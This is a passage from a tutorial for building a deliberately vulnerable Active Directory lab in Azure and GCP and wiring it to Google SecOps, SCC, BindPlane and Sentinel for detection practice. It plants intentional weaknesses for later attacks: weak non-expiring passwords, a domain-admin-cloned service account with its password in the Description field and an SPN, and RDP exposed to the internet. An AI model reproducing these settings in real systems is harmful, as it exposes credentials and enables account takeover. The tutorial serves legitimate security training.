VM_DC_DS_RESTORE_PASSWORD="P4ssw0rd.123"
VM_DC_DS_NETBIOS_NAME="AJRC"
```

Next, configure ADCS. You might want to keep track of the following information:

```bash
VM_DC_CS_ROLE="Certification Authority"
VM_DC_CS_SETUP_TYPE="Enterprise"
VM_DC_CS_CA_TYPE="Root CA"
VM_DC_CS_KEY_PROVIDER="RSA#Microsoft Software Key Storage Provider"
VM_DC_CS_KEY_LENGTH=2048
VM_DC_CS_KEY_ALGORITHM="SHA256"
VM_DC_CS_CA_COMMON_NAME="ajrc-dc-ajrc-local-CA"
VN_DC_CS_CA_DISTINGUISHED_NAME="DC=ajrc,DC=local"
VM_DC_CS_CA_VALIDITY_TIME="99 years"
```

Restart the VM to enforce the recent changes.

Create a shared folder as explained in [Kamran Bilgrami's post](https://kamran-bilgrami.medium.com/ethical-hacking-lessons-building-free-active-directory-lab-in-azure-6c67a7eddd7f) under the **Setting up a Share** heading.

Then, continue reading the post and create domain user accounts. These users will represent our enterprise environment context, and give a little bit more sense of living to our lab.

Open the **Server Manager** application and then open **Active Directory Users and Computers** under the **Tools** tab at the upper-right corner. Reorganize all users groups to a new organizatial unit (OU) named **Groups**.

![Clean ADUC Users built-in OU](/src/images/scc-secops-lab/33-dc-aduc_move_group_users_to_ou.png)

```diff
- ⚠️ If you mistakenly created an OU with the incorrect name and you need to delete it, activate **Advanced Features** under the **View** tab. Then, right-click the OU you want to delete and uncheck the box **Protect object from accidental deletion** in the **Object** tab. Then, you will be able to delete the OU.
```

Now, we need to create a few user accounts. The first two users you create must be normal users, i.e., right-click in the Users built-in OU and click **New > User**. The third user will be a service account for the SQL service, and you must deilberately create it by right-clicking the **Copy** menu option of the administrator account of the domain (In my case was `alejandro_rodriguez`).

```
VM_DC_UC_USER1_NAME="Sebastian Gomez"
VM_DC_UC_USER1_LOGON_NAME="sebastian_gomez@ajrc.local"
VM_DC_UC_USER1_PASSWORD="Password1"
VM_DC_UC_USER1_PASSWORD_CHANGE_REQUIRED="No"
VM_DC_UC_USER1_PASSWORD_EXPIRATION="Never"

VM_DC_UC_USER2_NAME="Angel Solis"
VM_DC_UC_USER2_LOGON_NAME="angel_solis@ajrc.local"
VM_DC_UC_USER2_PASSWORD="P4ssw0rd."
VM_DC_UC_USER2_PASSWORD_CHANGE_REQUIRED="No"
VM_DC_UC_USER2_PASSWORD_EXPIRATION="Never"

VM_DC_UC_USER3_NAME="SQL Service"
VM_DC_UC_USER3_LOGON_NAME="sql_srv@ajrc.local"
VM_DC_UC_USER3_PASSWORD="tv4=w@rkj0NkAg!x"
VM_DC_UC_USER3_PASSWORD_CHANGE_REQUIRED="No"
VM_DC_UC_USER3_PASSWORD_EXPIRATION="Never"
VM_DC_UC_USER3_PROPERTIES_DESCRIPTION="tv4=w@rkj0NkAg!x"
```

Notice that the **SQL service** account has a secure password (You can generate [here](https://1password.com/password-generator)). This is intended, because the idea of this account is not to crack the password, but to exfiltrate it. Right-click the **SQL service** account and select the **Properties** menu option. Add the password in the description field.

You might be thinking that this does not make sense at all (If you think that, then you are a good security specialist). However, you might be surprised to know that many AD administrators, especially those without strong security training, have been known to store service account passwords in the **Description**, **Notes**, or even **Display Name** fields of Active Directory user objects. Even if they do not store secrets, you may encounter [administrators storing other information in these fields](https://www.reddit.com/r/sysadmin/comments/12jp7iq/do_you_put_anything_in_the_description_field_of_ad/?utm_source=chatgpt.com), that you can use as a pentester to [collect valuable metadata](https://attack.mitre.org/techniques/T1005/) that can help you identify high-value systems or users.

```diff
+ ✅ This lab is not about remediation or system hardening, but you must learn from this example that even non-secret metadata is quite often sensitive. Avoid putting personally identifying information (PII) or role-sensitive metadata in publicly readable fields.
```

Now, we will create a [Service Principal Name(SPV)](https://learn.microsoft.com/en-us/archive/technet-wiki/717.service-principal-names-spn-setspn-syntax) for the SQL Service account.

An SPN is a unique identifier for a service instance in Active Directory (AD). It basically links a service with the account it uses to log in, allowing Kerberos authentication for services like SQL Server, IIS, or custom apps. You can read this [stackoverflow post](https://serverfault.com/questions/350782/can-someone-please-explain-windows-service-principle-names-spns-without-oversi) to learn more about SPNs.

To set a SPN for a service in Windows we use this format:

```cmd
set SERVICECLASS=MSSQLSvc
set FQDN=dc-ajrc-local.ajrc.local
set PORT=60111
set ACCOUNT=AJRC\sql_service

setspn -a %SERVICECLASS%/%FQDN%:%PORT% %ACCOUNT%
````

```diff
- ⚠️ You might have noticed that in Kamran Bilgrami's post, the SPN syntax that he used isn't syntactically correct.
```

For example, our **SQL Service** SPN can be assigned in this way:

```cmd
setspn -a MSSQLSvc/dc-ajrc-local.ajrc.local:60111 AJRC\sql_service
```

Once you add the SPN, you should get this output:

```cmd
Checking domain DC=ajrc,DC=local

Registering ServicePrincipalNames for CN=SQL Service,CN=Users,DC=ajrc,DC=local
        MSSQLSvc/dc-ajrc-local.ajrc.local:60111
Updated object
```

You can still validate that the SPN was created successfully by running the command following command:

```cmd
set DOMAIN=ajrc.local

setspn -T %DOMAIN% -Q */*
```

You should see the new SPN created at the end of the output.

Now move to your **WS**. Connect to it using **Windows RDP** from the **DC**. You can see the **Private IPv4 Address** of your VM in the **Virtual Machine Resource** created in Azure.

In the **WS** computer,
- Enable **Network Discovery** by opening **File Explorer** and clicking on the **Network** node. Click the message and select the option **Turn on network discovery and file sharing**. Then, select the **Private Network** option.
- In the **Etnernet IPv4 settings**, configure the IP address of the **DC** as the **DNS Address** for this machine.

```diff
+ ✅ If you have not do it yet, configure a static IPv4 address for the DC.
```

- Finally, join the computer to the domain. In the **Windows Search Bar**, look for `About your PC`. Then, In the **Related Settings** heading, click **Advanced System Settings**. Go to the **Computer Name** tab and click the **Change** button. Type the **NETBIOS** or **Domain Name** in the **Domain** field (You should have stored those values in the `VM_DC_DS_NETBIOS_NAME` and `VM_DC_DOMAIN_NAME` labels. For me, it was `AJRC` and `ajrc.local` respectively).

![Join the Workstation to the Windows Domain](/src/images/scc-secops-lab/35-ws-join_lab_domain.png)

- Restart the computer to apply the changes.

If you revisit your **DC**, you will notice that the computers have been added to **ADUC** in the built-in **Computers** OU.

Login to the **WS** using the **Domain Administrator** account (For me, this is `alejandro_rodriguez@ajrc.local`. You should have this value stored in the `AZURE_VM_DC_USERNAME` label).

Finally add users to the **Local Administrators Group**.
- In the **Windows Search Bar**, search for `Edit local users and groups`.
- In the **Groups > Administrators** node, add the users that you created earlier (`VM_DC_UC_USER1_LOGON_NAME` and `VM_DC_UC_USER2_LOGON_NAME`).

![Add User Accounts to the Local Adminsitrators Group](/src/images/scc-secops-lab/36-ws-add_local_administrators.png)

```diff
- ⚠️ If you read Kamran Bilgrami's post, you may have noticed that he actually deployed 2 client computers. The second VM is the RODC that we already created in GCP.
```

Repeat the steps that we just did in the **RODC** that is hosted in **GCP**. I.e. you must have the following configurations done:
- Enable **Network discovery**
- Configure the IP address of the **DC** as the **DNS Address** for this machine.
- However, do not join the **RODC** to the domain, since this process is done quite different to do compared to a standard workstation computer.

```diff
+ ✅ Configure a static IPv4 address for the RODC computer as well.
```

```diff
+ ✅ Disable Remote Desktop Network Level Authentication to avoid lossing access to this VM if the VPN tunnel fails for any reason.
```

For the RODC, chose either `VM_DC_UC_USER1_LOGON_NAME` and `VM_DC_UC_USER2_LOGON_NAME` and add it as a **Local Administrators Group**.

Now, begin setting up the **RODC** itself. You might want to watch [this video](https://www.youtube.com/watch?v=Bur7XxUYq4A&ab_channel=DannyMoran) before setting up the **RODC**.
- Install the **Active Directory Domain Service** role, like when you set up the **DC**.
- When you promote the **RODC** as a domain controller, make sure you select the option **Add a domain controller to an existing domain**. 

Keep track of the following configuration:

```bash
VM_RODC_DOMAIN_NAME=ajrc.local   # You can chose your personal domain
VM_RODC_HOSTNAME="rodc-ajrc-local"
VM_RODC_FQDM="rodc-ajrc-local.ajrc.local"
VM_RODC_DS_CONTROLLER_OPTIONS_RODC="Enabled"
VM_RODC_DS_CONTROLLER_OPTIONS_SITE="Default-First-Site-Name"
VM_RODC_DS_RESTORE_PASSWORD="P4ssw0rd.123"
```

![Validate RODC in the RODC itself](/src/images/scc-secops-lab/38-rodc-validate_rodc_in_rodc.png)

At this point you should have your domain environment up and running.

You might want to make a little change nonetheless. Remove the public IP address interface of the **AD** and give it to the **WS**. It is actually well-known that [domain controllers are sensitive assets](https://learn.microsoft.com/en-us/microsoft-identity-manager/pam/privileged-identity-management-for-active-directory-domain-services), which means that they must be treated carefully. **Domain Controllers must not be exposed to the internet for any means.** 

To do this, disassociate the public IP address resource object from the **DC** VM, and assign the public IP address resource object to the **WS** VM. You will need to add an **Inbound Security Rule** to the **Network Security Group** associated to your **WS** VM, that permits RDP (`TCP/3389`) traffic.

```diff
- ⚠️ For the record, leaving RDP open to the internet for a WS is still a very bad practice, but not as terrible as leaving a DC open to the wild.
```

```diff
- ⚠️ If you cannot connect to the VM via RDP, it is possible that the size of the VM is affecting the performance of the remote connection. Resize the VM from `B1s` to `B1ms`, which provides 2GB of RAM instead of 1GB. Keep in mind that this operation might take a while to complete.
```

**Cloud misconfiguration, Shadow IT and Poor IAM**

This is the last part of the initial set up of the lab environment. The misconfigurations and IAM flaws that we are going to introduce are important because they **mirror real-world mistakes**, they are **exploitable through observable actions** (API calls, login attempts, permission misuse), and finally, they **leave telemetry breadcrumbs** that **Google SCC** and **Google SecOps** can detect and alert on.

First, we are going to set up **cloud Misconfigurations** in **GCP**.

```diff
- ⚠️ This part of the lab will be added in the future. Besides, you should already have various misconfigurations if you followed the instructions.
```

Second, we are going to do something called **Shadow IT**. This refers to the deployment of cloud resources outside central command and control that still have access to sensitive data.

```diff
- ⚠️ This part of the lab will be added in the future.
```

Finally, we just need to consigure **poor IAM settings** that allow adversaries to exploit (even more) our environment.

```diff
- ⚠️ This part of the lab will be added in the future.
```

### Setting Up Part 2: SCC and Google SecOps

Now that you have your environment deployed, it is time to enable our monitoring applications.

**Enable Security Command Center**
- Go to GCP Console > Security > Security Command Center.
- Select your organization or folder > click Enable.
- Choose the Standard or Premium Tier.
- Enable built-in detectors for:
    - IAM anomalies
    - VM misconfigurations
    - Publicly exposed services (Cloud Run, GCS, etc.)

![Enable Security Command Center](/src/images/scc-secops-lab/39-scc-enable_scc.png)

![Enable Cloud Run Threat Detection ](/src/images/scc-secops-lab/40-scc-enable_cloud_run_threat_detection.png)

Security Command Center will start analyzing your environment and indexing all your resources. For this reason, it might take a while before you can start seeing some findings in your environment. You might want to read [When to expect findings in Security Command Center](https://cloud.google.com/security-command-center/docs/concepts-scan-latency-overview) from SCC documentation.

**Install and Configure Windows Sysmon**

Install Windows Sysmon in your all your Windows machines. I have already documented this process in [another repository](https://github.com/AzJRC/Security-Operations/tree/develop/sysmon#quick-installation) that you might want to check!

```diff
+ ✅ Also check the section "XML Configuration file" in my repository, where I mention the `sysmon-config` file by SwiftOnSecurity. This will help you tailor the configuration of your Sysmon Installation.
```

![Install Windows Sysmon in Workstation](/src/images/scc-secops-lab/41-ws-install_windows_sysmon.png)

**Setup extended logging in the windows domain**

```diff
- ⚠️ This part of the lab will be added in the future.
```

https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/audit-policy-recommendations?tabs=winserver


**Ingest network telemetry data from on-premises to Google SecOps using Google SecOps Forwarder**

```diff
- ⚠️ This part of the lab will be added in the future.
```

**Ingest telemetry data from endpoints to Google SecOps using BindPlane Agent**

The next step is to install the **BindPlane Agent**. This is the application that will collect the endpoint logs to Google SecOps end-to-end.

Begin by installing the BindPlane Agent on each Windows host. Go to [Bindplane's website](https://bindplane.com/) and click the button **Get Started**. You can use BindPlane Cloud App for free. The only [limitations](https://bindplane.com/pricing) is that you can only install 10 agents and ingest up 10GB of logs daily, but that's enough for our small laboratory.

Once you create your account, you should see a dashboard like mine, depicted below.

![BindPlane App Dashboard](/src/images/scc-secops-lab/42-bindplane-bindplane_dashboard.png)

```diff
+ ✅ You can configure dark-mode by clicking the gear located in the upper-right corner of the UI. Search the relevant setting.
```

Follow the steps below to set up BindPlane for our purposes.
- Go to **Configurations** tab and click the button **Create Configuration**.
- You can type any name for the configuration (E.g. `secops-scc-lab-bpconfig_stable-ws`).
- For the **Agent Type** select `BDOT 1.x (Stable)` (This might change in the future).

```diff
+ ✅ I encourage you to try the Agent Type 2.0 (BETA). It is more powerful and efficient than the stable version, but it may not work. 
```

- For the **Platform** select `Windows`
- You can add a description if you want (E.g. `Google SecOps and Security Command Center Lab`).
- Click the **Next** button.

In the next page of the configuration you need to add a **source**. A source refers to the originators of event logs. In our case, that is the **Windows Events API**. Search for `Windows Events`. You can add a description if you want (E.g. `Standard Windows Events`) but that's not required at all. Click **Save**.

You need to add a second source for Windows Sysmon events. Windows Sysmon are also generated by the Windows Events API, but they are not saved in an standard provider. Click the button **Add Source** and search again for `Windows Events`. Uncheck all default log providers (`System Events`, `Application Events`, and `Security Events`) and open the **Advanced** options. Add `Microsoft-Windows-Sysmon/Operational` in the **Custom Channels** field. You can add a description for this source as well if you want (E.g. `Sysmon Events`).

```diff
- ⚠️ Did you notice the **Raw Logs** checkbox in the advanced configuration? you might need to enable that option for both sources later if parsing in Google SecOps fails. But leave it unchecked for now.
```

Click **Next** and you are in the final step of this configuration. Click **Add Destination**. You might already know what this is, but it refers to the receiver of the logs. Search for `Google SecOps`. Follow the steps below to properly configure the destination:
- The **Name** of your destination. You can type whatever you want, but it should be a name that reminds you which sources are linked to this destination (E.g. `secops-scc-lab-secops-dst`)`.
- In the **Protocol** drop-down menu, select `gRPC`.
- In the **Endpoint** field, you must type the [regional Google SecOps endpoint](https://cloud.google.com/chronicle/docs/reference/ingestion-api#regional_endpoints) that is closest to you. If you are in Mexico or the United States, you can leave the default value.
- In the **Autentication Method** drop-down menu, select `JSON`. The steps to find this JSON file is explained later.
- You can leave blank the **Fallback Log Type** if you want or type `WINEVTLOG`. Google SecOps Log Type is a **Special Ingestion Label** that tell Google SecOps what kind of logs are being ingested, which determines the **[Parser](https://cloud.google.com/chronicle/docs/event-processing/parsing-overview)** that will be used to transform raw data to [**UDM**](https://cloud.google.com/chronicle/docs/event-processing/udm-overview). Refer to [Supported log types and default parsers](https://cloud.google.com/chronicle/docs/ingestion/parser-list/supported-default-parsers) to search for "**Supported log types [labels] with a default parser**". 
- In the **Customer ID** field, you must paste your Google SecOps unique customer ID. The steps to find this information is explained later.
- Open the **Advanced** settings. It is a good practice to include **Ingestion Labels** (besides the Log Type already configured) to describe the context of the ingestion. I always add the label `env` with the value `test` for **testing environment** (or `prod` for or **production environment**).
- The **Namespace** is another special setting that you might want to configure, altough is not strictly necessary. The namespace serves to differentiate logs orginated from different logical networks that have the same network address. When dealing with Windows Domains, I usually type the domain name (E.g. `ajrc.local`), but you could define your own schema for this field.
- Leave the remaining options as is.
- Once you have everything configured (you do not, you are missing the **Credentials** and **Customer ID** field), click **Save**.

To get the **Credentials** and **Customer ID** values, you need to login to your Google SecOps Instance. In the left sidebar, go to **Settings > SIEM Settings > Profile**. Here you will find your **Customer ID**. Then, go to **Settings > SIEM Settings > Collection Agents** and click the download icon at the right of **"Ingestion Authentication File"**. This will download a file named `auth.json` which you need to open and copy its content. That is the JSON that you must copy in the **Credentials** field.

![Get Customer ID in Google SecOps](/src/images/scc-secops-lab/43-secops-customer_id_location.png)
![](/src/images/scc-secops-lab/44-secops-ingestion_authentication_file.png)

With the configuration ready, the only thing missing is the collector agent in the workstation. You might have noticed that you were redirected to a page where you can see a live diagram showing you the ingestion process from source to destination. Click the button **Add Agents**.

![Download Authentication JSON file in Google SecOps](/src/images/scc-secops-lab/45-bindplane-ingestion_diagram_ws_config.png)

In the agent installation, first select the same **Agent Type** and **Platform** that you choose earlier when creating the configuration. Then specify the configuration that will appear in a drop-down menu and click **Next**.

Now, copy the command that appears on screen. You need to run this command in the **WS** computer in a **Privileged Command Prompt Shell**. Wait a few seconds and the agent will appear in the UI, as shown below.

```diff
- ⚠️ If you tried out the Agent Beta and it did not work, you need to uninstall that program first. Search `Add or remove programas` in Windows Search and uninstall **BindPlane Distro for OpenTelemetry Collector**.
```

```diff
+ ✅ If you want to see the installation wizard of BindPlane, remove the parameter `/quiet` from the command.
```

![BindPlane Agent Installed in WS](/src/images/scc-secops-lab/46-bindplane-install_bindplane_agent_from_bindplane_ui_for_ws.png)

Now, click **Return to Agents**. Go to the **Configurations** page and open the only configuration you have at the moment. You should see the **Start Rollout** button. This button will appear every time you make a change in the cofiguration of the ingestion pipeline (I.e., adding, removing or modifying a  **source**, **processor**, or **destination**). Before rolling-out the configuration to the agent, you might algo have seen the button to update the **API Version** of BindPlane (Do not confuse the API version and the Agent version). Update the API and then roll-out the configuration to your BindPlane agent in the **WS**.

With the BindPlane API v2 we have now two extra features called **Routes** and **Connectors** that allow us to manage our ingestion pipeline in more ways. You should also notice that our agent has received the configuration. Below you will see a table listing the agents associated with the current BindPlane configuration and the **Configuration Version** (Every time you roll-out a new configuration, the configuration version will increase by one).

![BindPlane Agent Configuration Versioning](/src/images/scc-secops-lab/47-bindplane-agent_configuration_versioning.png)

Now, configure the **[Processor](https://bindplane.com/docs/feature-guides/processors)** nodes in the ingestion pipeline. The documentation explains that "*processors inserted after a source will only be applied to that particular sources data*" and "*processors inserted before a destination will be applied to all data flowing into it from all sources*". Given said this, we want to:
- Tag the logs with the Log Type Ingestion Label
- Clean the logs before they reach Google SecOps

The first pre-processing step should be configured in the processor near the source, because Windows Event Logs have a different Log Type than Windows Sysmon Event Logs. The Log Type ingestion label for standard Winodws Event Logs is `WINEVTLOG` (or `WINEVTLOG_XML` if raw logs are ingested), and the Log Type ingestion label for Windows Sysmon Event Logs is `WINDOWS_SYSMON`. You can validate this in [Supported log types and default parsers](https://cloud.google.com/chronicle/docs/ingestion/parser-list/supported-default-parsers).

Click the left processor near the Windows Event Logs source collector and click **Add processor**. Search the processor `Google SecOps Standardization`. You can type a description if you want (I like to type the Log Type Ingestion Label. E.g. `WINEVTLOG`). Click the button **Add Log Type** and type `WINEVTLOG` in the **Log Type** field. You can type a namespace if you want (E.g. `ajrc.local`) and again, include the `env` and `test` ingestion labels key-value pair. Click **Save**.

Repeat the steps in the left procesor near the Windows Sysmon Event Logs source collector, but using the `WINDOWS_SYSMON` Log Type ingestion label.

In the right processor near the destination you should see some **Recommended Processors**. Click **View** for the **Delete Empty Values** processor. As you might expect, this processor will not forward log entries that are empty, reducing the size of the log and optimizing the ingestion pipeline. Click **Accept** to add it.

Now that you configured all your processors, rollout the configuration again by clicking the button **Start Rollout**.

One of the best things of BindPlane is that you can see a portion of your logs being ingested in real-time. Click the processor near the destination. In the left panel, BindPlane shows you the logs before the preprocessing step. In the right panel, BindPlane shows you the logs after the preprocessing step. Inspect the logs in the right panel and verify that the Ingestion Labels were applied effectivelly, as shown in the picture below.

![Inspecting Log Ingestion in Real-Time](/src/images/scc-secops-lab/48-bindplane-inspecting_log_preprocess_in_real_time.png)

With this done. You finished the configuration and deployment of BindPlane agent for your **WS**. Now, create another configuration for your Domain Controllers. Everything should be almost the same, except for the following values:
- Configuration name should be something like `secops-scc-lab-bpconfig_stable-dc`
- Description of the configuration should be comething like `Google SecOps and Security Command Center Lab (DC)`
- Add sources for Windows Events and Windows Sysmon Events as we did earlier.
- Add a third source for Microsoft Active Directory logs. Search for `Microsoft Active Directory` and add that source. You can add a description if you want (E.g. `Microsoft Active Directory Events`). The Log Type Ingestion Label for this source are `WINDOWS_DNS` and `ADFS`. Read [Collect Microsoft Windows DNS logs](https://cloud.google.com/chronicle/docs/ingestion/default-parsers/windows-dns) to set up the DNS source.

![Enable Analytics and Debug Logs for DNS](/src/images/scc-secops-lab/50-dc-ad_enable_dns_logs.png)

- Add a fourth source. For this one, search `File`. This is a generic log type. In the **Description** field `Microsoft Windows AD Logs`  and in the **File Path(s)** field type `C:\ad_logs\ad_logs.json`. Read [Collect Microsoft Windows AD logs](https://cloud.google.com/chronicle/docs/ingestion/default-parsers/windows-ad#configure_microsoft_windows_ad_servers) to set up this source in the **DC**.

![Add ad_logs_script.ps1 And Create Schedule Task](/src/images/scc-secops-lab/49-dc-ad_logs_test_script.png)

- You will notice that the Google SecOps destination was saved. Select that destination.
- Configure the **Google SecOps Standardization** preprocessors.
    - For Windows Events Logs and Wndows Sysmon Events Logs, the Log Type Ingestion Label is the same.
    - For the File source, use the Log Type `WINDOWS_AD`.
    - For the Microsoft Active Directory source, we need to configure two Log Types. One for Microsoft AD FS which is `ADFS` and one for Windows DNS which is `WINDOWS_DNS`. Later I explain how to do this.
- Configure the **Remove Empty Fields** preprocessor.
- Install the agents.

![](/src/images/scc-secops-lab/51-bindplane-install_bindplane_agent_from_bindplane_ui_for_dc_and_rodc.png)

- Rollout the configuration.

Now, you might be wondering how to configure two **Log Types** for the **Microsoft Active Directory** source. The **Google SecOps Standardization** processor supports conditionals. When creating the standardization process, click two times the button **Add Log Type**.

In the first Log Type entry type `ADFS`. This is the default Log Type for this processor. In the second Log Type entry type `WINDOWS_DNS`. If you were to leave the configuration as it is right now, the Log Type Ingestion Label will be always `WINDOWS_DNS`, because this preprocessing step happens at last. However, you can add an **OTTL Condition Expression**.

Click the button **Add Condition**. In the **Match** drop-down menu select `Attributes`. In the **Field** entry, type `log_type`. The operator should be set to `Equals`. Finally, the **String** entry should be `active_directory.dns`.

With this settings, all DNS-related events are going to be tagged with the Log Type Ingestion Label `WINDOWS_DNS`. The events that do not match the rule will remain as `ADFS`.

Once you reach this point, you are done setting up BindPlane Agent. You can quickly verify your ingestion in Google SecOps as well.

In Google SecOps go to **Dashboards and Reports > Dashbaords** and search the built-in dashboard **Data Ingestion and Health**. Change the **Global Time Filter** to search for past events one day ago.

You should be able to see various graphs showing the ingestion of the last day.

![Google SecOps Data Ingestion and Health Dashboard](/src/images/scc-secops-lab/53-secops_dashboards-ingestion_and_health_dashboard.png)

```diff
- ⚠️ It is very likely that you have a lot of parsing errors, as I had, as shown in the picture below. You can try troubleshoot this in several ways. The list of possible actions to solve the issues are explained next.
```

![Google SecOps Parsing Errors](/src/images/scc-secops-lab/54-secops_dashboards-ingestion_and_health_dashboard_ingestions_event_by_log_type.png)

You have a few options to try solve the issue. 

1. One is to change the Log Type Ingestion Label of the Windows Events to `WINEVTLOG_XML` and check the box **Raw Logs** in your BindPlane source collectors. I have tried this several times and always fixes the issue.
2. Another option you have is to check the Google SecOps Parsers. Go to **Settings > SIEM Settings > Parsers** and inspect the list or parsers that you have enabled. You might have a **Pending Parser Update**. If you have, click the vertical ellipsis and select the option **View Pending Update**. Then click the button **Make Parser Update Active** and confirm the update.
3. The final option you have is to wait. Sometimes, Google SecOps needs a little bit of time (days) to update its parsers and adjust to your logs. You can wait before doing any change in your configuration. If you notice that the problem is not solving by itself, try option 1.


**Ingest telemetry data from Google Cloud to Google SecOps**

```diff
- ⚠️ This part of the lab will be added in the future.
```

> AUTHOR'S NOTE: My current Google Cloud Platform account and Google SecOps instance are not in the same organization, and I do not have organizational-level access in my GCP account, which is required to set up this ingestion pipeline. I will be updating the documentation as soon as I have in my hands a suitable environment to work with.

**Ingest Azure Sentinel Alerts to Google SecOps using SIEM Feeds and SOAR Integrations**

You can [ingest Microsoft Sentinel Alerts and Incidents using Google SecOps SIEM Feeds](https://cloud.google.com/chronicle/docs/ingestion/default-parsers/ms-sentinel).

Begin by creating a webhook Feed in Google SecOps.

1. Navigate to **Google SecOps Console** → `SIEM Settings` > `Feeds`.
2. Click **Add New Feed**.
3. Select **Configure a single feed**.
4. Provide the following configuration:
   - **Feed name**: e.g., `Microsoft Sentinel Alerts`
   - **Source type**: Webhook
   - **Log type**: Microsoft Sentinel
5. Complete the configuration and click **Submit**.
6. Click **Generate Secret Key**, and securely store the generated secret.
7. From the **Details** tab, copy the **Feed Endpoint URL**. You will use this in the Logic App HTTP action.

You will also need an API Key for Google SecOps.

1. Go to the **Google Cloud Console** → `APIs & Services` > `Credentials`.
2. Click **Create credentials** → select **API key**.
3. Restrict the API key to the **Chronicle API**.

Finally, deploy a Logic App in Microsoft Azure and configure the Logic App Workflow.

1. In the **Azure Portal**, click **Create a resource** and search for **Logic App**.
2. Choose the **Consumption (Multi-tenant)** plan.
3. Fill in the required details:
   - **Subscription**, **Resource Group**, **Name**, and **Region**
   - Select your **Log Analytics Workspace**
4. Click **Review + create**, then click **Create**.
5. Go to the created Logic App → `Logic App Designer`.
6. Click **Add a trigger**, search for **Microsoft Sentinel**, and select:
   - **"When an incident is created"** or **"When an alert is created"**
7. If required, authenticate to Microsoft Sentinel.
8. Click **New Step** → search for **HTTP**, and add the HTTP action.
9. Configure the HTTP action with:
   - **Method**: POST
   - **URI**: The Feed Endpoint URL from Google SecOps
   - **Headers**:
     - `Content-Type: application/json`
     - `X-goog-api-key: <YOUR_API_KEY>`
     - `X-Webhook-Access-Key: <YOUR_SECRET_KEY>`
   - **Body**: Use dynamic content from the Sentinel trigger.

This enabled Microsoft Sentinel Logic App to forward incidents and alerts to Google SecOps via a webhook feed.

Alternatively, you can also [integrate Microsoft Sentinel Alerts and Incidents using Google SecOps SOAR Microsoft Sentinel Integration](https://cloud.google.com/chronicle/docs/soar/marketplace-integrations/microsoft-azure-sentinel).

First, you need to register an Application in Microsoft Entra ID.

1. Go to **Azure Portal** → `Microsoft Entra ID` → `App registrations`.
2. Click **New registration**.
3. Enter a name (e.g., `SecOps-Sentinel-Integration`).
4. Set **Supported account types** to: Accounts in this organizational directory only.
5. Click **Register**.
6. Copy the **Application (client) ID** and **Directory (tenant) ID**.

Then, create a Client Secret.

1. In the same app, go to **Certificates & secrets**.
2. Click **New client secret**.
3. Add a description and expiration period, then click **Add**.
4. Copy the **client secret value** immediately.

To be able to pull alerts and incidents from Microsoft Sentinel, assign the appropiate IAM permissions to the application.

1. Navigate to the **Microsoft Sentinel workspace**.
2. Go to **Access control (IAM)** → **Add role assignment**.
3. Configure:
   - **Role**: Azure Sentinel Contributor
   - **Assign access to**: User, group, or service principal
   - **Select** your app from the list
4. Confirm and assign the role.

Finally, install and configure the integration in Google SecOps Marketplace.

1. In the **Google SecOps SOAR console**, select the **Microsoft Sentinel Integration**.
2. Enter the following credentials:
   - **Tenant ID**
   - **Client ID**
   - **Client Secret**
   - **Sentinel Workspace Name**
   - **Resource Group**
3. Test the connection and finalize the configuration.

This integration enables API-based access to Microsoft Sentinel data for incident enrichment, threat hunting, and automated SOAR workflows.

**Ingest Azure NSG events to Google SecOps SIEM using Feeds with a custom parser**

```diff
- ⚠️ This part of the lab will be added in the future.
```

https://davidsantiago.fr/nsg-flow-logs-to-event-hubs-using-logstash-and-container-apps/
https://www.elastic.co/docs/reference/integrations/azure_network_watcher_nsg
https://cloud.google.com/chronicle/docs/secops/release-notes


**Setup a SecOps Integration with Microsoft Active Directory**

In this part of the set up, you must read first the [Integrate Active Directory with Google SecOps](https://cloud.google.com/chronicle/docs/soar/marketplace-integrations/active-directory) documentation page. Then, review [Create [Google SecOps SOAR] Agent with Docker](https://cloud.google.com/chronicle/docs/soar/working-with-remote-agents/deploy-agent-with-docker), which is a necessary component for this specific integration we aim to deploy.

In Google SecOps, integrations are just collection of python scripts that interact with our third-party solutions, like Microsoft Active Directory. Other examples of third-party software solutions that could be integrated with Google SecOps include Azure Entra Id (formerly, Azure Active Directory), GMAIL, and SentinelOne.

This integration will allow us to perform automated actions in our Active Directory server from inputs and events detected in Google SecOps. For instance, if we detect an unknown user createing a scheduled task ([T1053.005](https://attack.mitre.org/techniques/T1053/005/)), we might want to disable the user account or at least alert some administrator. We can do that with an automated workflow from Google SecOps SOAR playbooks, but the specific interactions with Microsoft Active Directory are abstracted by the integration.

First, install the Microsoft Active Directory integration in Google SecOps Marketplace, as shown in picture below.

![](/src/images/scc-secops-lab/64-secops-active_directory_integration.png)

The next step is to install the Google SecOps SOAR agent in a computer that can reach the Active Directory computer, in this case, the **DC**. I decided to create a Linux VM (Ubuntu 22 LTS) in the Azure VNET. After that, install docker in the system. You can quickly install docker with the command `sudo apt-get install docker.io`; however, keep in mind that for production environments you should install docker using the official sources.

Once you install docker, simply go to **Settings > SOAR Settings** in Google SecOps, and localize the **Advanced > Remote Agents** page. Click the plus icon in the upper-right corner of the web interface and select **Docker Deployment**. Type the name of the remote agent (E.g. `secops_scc_lab_active_directory_agent`), and click **Next**.

In the next page of the Remote Agent Docker you will be provided a quick command to deploy the container. Just copy the command and run it in your VM with docker. In a few minutes you should have your Remote Agent up and running in the computer. Go back to Google SecOps and click **Next**. In a few seconds you should get a success message.

![](/src/images/scc-secops-lab/64-secops-success-install-soar-agent.png)

Before setting the configurations of the agent in the integration, you need to modify the `/etc/hosts` file of the docker container and an entry that maps the hostnames and IP addresses of the computer with Active Directory (In this case, the **DC**). Run the command `sudo docker exec -u root -t -i siemplify_agent_secops_scc_lab_active_directory_agent /bin/bash` to start a privileged shell in the container, and then run `vi /etc/hosts` to edit the file. Add a line at the end of the file mapping the IP address and FQDM of your **DC** (E.g. `172.16.1.4 ad-ajrc-local.ajrc.local`)

Finally, go back to Google SecOps and move to **Response > Integration Setup**. In this page, you shuold have the Active Directory integration listed. Click the gear icon and configure the mandatory entry fields:
- In the **Server** entry, configure either the IPv4 address or FQDM of the **DC** (E.g. `ad-ajrc-local.ajrc.local`).
- In the **Username** entry, add the username of the administrator account (E.g. `alejandro_rodriguez`). Keep in mind that in real implementations, you should use a dedicated service account.
- In the **Domain** entry, type your windows domain name (E.g. `ajrc.local`).
- In the **Password** field, type the user account password associated to the user you typed in the **Username** field.
- Lastly, enable **Run Remotely** and select the remote agent you just created in the UI.

Once you have all the configuration, click **Save**. Wait a few seconds and then click the **Test remotely** button. You should see a green check, meaning that everything worked as expected.

```diff
